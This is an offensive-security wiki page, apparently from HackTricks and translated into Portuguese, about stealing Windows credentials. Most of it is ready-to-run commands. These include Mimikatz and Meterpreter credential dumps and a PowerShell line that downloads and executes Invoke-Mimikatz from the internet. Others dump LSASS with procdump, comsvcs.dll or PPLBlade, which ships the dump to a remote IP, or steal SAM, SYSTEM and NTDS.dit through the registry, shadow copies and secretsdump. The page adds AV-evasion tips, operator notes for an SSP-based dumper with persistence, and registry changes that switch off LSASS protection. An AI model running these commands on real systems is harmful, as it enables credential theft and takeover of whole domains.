# Roubando Credenciais do Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciais Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encontre outras coisas que Mimikatz pode fazer em** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saiba sobre algumas possíveis proteções de credentials aqui.**](credentials-protections.md) **Essas proteções podem impedir que o Mimikatz extraia algumas credentials.**

## Credentials with Meterpreter

Use o [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** eu criei para **procurar passwords and hashes** dentro da vítima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contornando AV

### Procdump + Mimikatz

Como **Procdump** da [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **é uma ferramenta legítima da Microsoft**, não é detectado pelo Defender.\
Você pode usar essa ferramenta para **fazer dump do processo lsass**, **baixar o dump** e **extrair** as **credentials localmente** a partir do dump.

Você também pode usar [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Este processo é executado automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead of** the **name lsass.exe.**

### Dumping lsass com **comsvcs.dll**

Uma DLL chamada **comsvcs.dll** encontrada em `C:\Windows\System32` é responsável por **dumping process memory** no caso de uma falha. Esta DLL inclui uma **function** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
É irrelevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O process ID a ser dumpado constitui o primeiro componente, a localização do arquivo de dump representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\
Ao analisar esses três componentes, a DLL procede à criação do arquivo de dump e à transferência da memória do processo especificado para esse arquivo.\
A utilização de **comsvcs.dll** é viável para dumping do processo lsass, eliminando assim a necessidade de fazer upload e executar procdump. Este método é descrito em detalhe em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Você pode automatizar este processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Clique com o botão direito na Barra de Tarefas e abra o Gerenciador de Tarefas
2. Clique em Mais detalhes
3. Procure pelo processo "Local Security Authority Process" na aba Processos
4. Clique com o botão direito no processo "Local Security Authority Process" e selecione "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte da suíte [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma ferramenta Protected Process Dumper que suporta ofuscar memory dump e transferi-lo para estações de trabalho remotas sem gravá-lo no disco.

**Funcionalidades principais**:

1. Contornar a proteção PPL
2. Ofuscar arquivos de memory dump para evitar mecanismos de detecção baseados em assinaturas do Defender
3. Enviar memory dump usando métodos de upload RAW e SMB sem gravá-lo no disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping sem MiniDumpWriteDump

Ink Dragon fornece um dumper em três estágios chamado **LalsDumper** que nunca chama `MiniDumpWriteDump`, então hooks de EDR nessa API nunca disparam:

1. **Estágio 1 loader (`lals.exe`)** – procura em `fdp.dll` por um placeholder consistindo de 32 caracteres `d` minúsculos, sobrescreve-o com o caminho absoluto para `rtu.txt`, salva o DLL patchado como `nfdp.dll`, e chama `AddSecurityPackageA("nfdp","fdp")`. Isso força o **LSASS** a carregar o DLL malicioso como um novo Security Support Provider (SSP).
2. **Estágio 2 dentro do LSASS** – quando o LSASS carrega `nfdp.dll`, o DLL lê `rtu.txt`, XORa cada byte com `0x20`, e mapeia o blob decodificado na memória antes de transferir a execução.
3. **Estágio 3 dumper** – o payload mapeado re-implementa a lógica do MiniDump usando **direct syscalls** resolvidos a partir de nomes de API hasheados (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Um export dedicado chamado `Tom` abre `%TEMP%\<pid>.ddt`, streama um dump comprimido do LSASS para o arquivo, e fecha o handle para que a exfiltração possa ocorrer depois.

Operator notes:

* Mantenha `lals.exe`, `fdp.dll`, `nfdp.dll`, e `rtu.txt` no mesmo diretório. O Estágio 1 reescreve o placeholder hard-coded com o caminho absoluto para `rtu.txt`, então separá-los quebra a cadeia.
* O registro acontece ao adicionar `nfdp` em `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Você pode pré-definir esse valor você mesmo para forçar o LSASS a recarregar o SSP a cada inicialização.
* Arquivos `%TEMP%\*.ddt` são dumps comprimidos. Descomprima localmente e depois alimente-os no Mimikatz/Volatility para extração de credenciais.
* Executar `lals.exe` requer privilégios admin/SeTcb para que `AddSecurityPackageA` tenha sucesso; quando a chamada retornar, o LSASS carrega transparentemente o SSP malicioso e executa o Estágio 2.
* Remover o DLL do disco não o expulsa do LSASS. Ou delete a entrada do registro e reinicie o LSASS (reboot) ou deixe-o para persistência de longo prazo.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Extrair o NTDS.dit do DC alvo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump o histórico de password do NTDS.dit no DC alvo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Exibir o atributo pwdLastSet para cada conta do NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Estes arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode simplesmente copiá-los de maneira normal** porque eles são protegidos.

### Do Registro

A maneira mais fácil de extrair esses arquivos é obter uma cópia do registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Você pode realizar a cópia de arquivos protegidos usando este serviço. É necessário ser Administrador.

#### Usando vssadmin

O binário vssadmin está disponível apenas em versões do Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mas você pode fazer o mesmo no **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (a unidade usada é "C:" e é salvo em C:\users\Public), mas você pode usar isto para copiar qualquer arquivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Código do livro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Finalmente, você também pode usar o [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia do SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciais do Active Directory - NTDS.dit**

O ficheiro **NTDS.dit** é conhecido como o coração do **Active Directory**, contendo dados cruciais sobre objetos de usuário, grupos e as suas memberships. É onde os **password hashes** dos utilizadores do domínio são armazenados. Este ficheiro é uma base de dados **Extensible Storage Engine (ESE)** e reside em **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro desta base de dados, três tabelas principais são mantidas:

- **Data Table**: Esta tabela é responsável por armazenar detalhes sobre objetos como usuários e grupos.
- **Link Table**: Mantém o registo das relações, como memberships de grupos.
- **SD Table**: **Security descriptors** para cada objeto são guardados aqui, garantindo a segurança e o controlo de acesso dos objetos armazenados.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows usa _Ntdsa.dll_ para interagir com esse ficheiro e ele é usado por _lsass.exe_. Assim, **parte** do ficheiro **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (é possível encontrar os dados mais recentemente acedidos provavelmente devido à melhoria de desempenho ao usar um **cache**).

#### Descriptografando os hashes dentro do NTDS.dit

O hash é cifrado 3 vezes:

1. Descriptografar o Password Encryption Key (**PEK**) usando o **BOOTKEY** e **RC4**.
2. Descriptografar o **hash** usando **PEK** e **RC4**.
3. Descriptografar o **hash** usando **DES**.

**PEK** tem o **mesmo valor** em **cada domain controller**, mas é **cifrado** dentro do ficheiro **NTDS.dit** usando o **BOOTKEY** do ficheiro **SYSTEM** do **domain controller (é diferente entre domain controllers)**. É por isso que, para obter as credenciais do ficheiro NTDS.dit, **você precisa dos ficheiros NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Disponível desde o Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Você também pode usar o truque [**volume shadow copy**](#stealing-sam-and-system) para copiar o **ntds.dit** file. Lembre-se de que você também precisará de uma cópia do **SYSTEM file** (novamente, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **Extraindo hashes de NTDS.dit**

Depois de obter os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Você também pode **extraí-los automaticamente** usando um usuário domain admin válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **arquivos NTDS.dit grandes** recomenda-se extraí-los usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, você também pode usar o **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio de NTDS.dit para um banco de dados SQLite**

Objetos NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não são extraídos apenas os segredos, mas também os objetos completos e seus atributos para permitir extração adicional de informações quando o arquivo NTDS.dit bruto já foi recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
O hive `SYSTEM` é opcional, mas permite a descriptografia de segredos (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Faça o download do binary em [here](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar este binary para extrair credentials de vários softwares.
```
lazagne.exe all
```
## Outras ferramentas para extrair credenciais do SAM e LSASS

### Windows credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Faça o download em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrai credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrair credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e simplesmente **execute-o** e as senhas serão extraídas.

## Minerando sessões RDP inativas e enfraquecendo controles de segurança

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### Coleta de telemetria ao estilo DumpRDPHistory

* **Outbound RDP targets** – analise cada hive de usuário em `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subchave armazena o nome do servidor, `UsernameHint`, e o timestamp da última escrita. Você pode replicar a lógica do FinalDraft com PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – consulte o log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` para Event IDs **21** (logon bem-sucedido) e **25** (desconexão) para mapear quem administrou a máquina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Depois de saber qual Domain Admin se conecta regularmente, dump LSASS (com LalsDumper/Mimikatz) enquanto a sessão deles estiver **desconectada**. CredSSP + NTLM fallback deixa o verificador e os tokens no LSASS, que podem então ser reproduzidos via SMB/WinRM para extrair o `NTDS.dit` ou implantar persistência em controladores de domínio.

### Rebaixamentos do registro visados pelo FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Definir `DisableRestrictedAdmin=1` força a reutilização completa de credential/ticket durante o RDP, permitindo pivôs no estilo pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` desativa a filtragem de tokens do UAC, de modo que administradores locais recebem tokens sem restrições pela rede.
* `DSRMAdminLogonBehavior=2` permite que o administrador DSRM faça logon enquanto o DC estiver online, dando aos atacantes outra conta integrada de alto privilégio.
* `RunAsPPL=0` remove as proteções PPL do LSASS, tornando o acesso à memória trivial para dumpers como LalsDumper.

## Referências

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
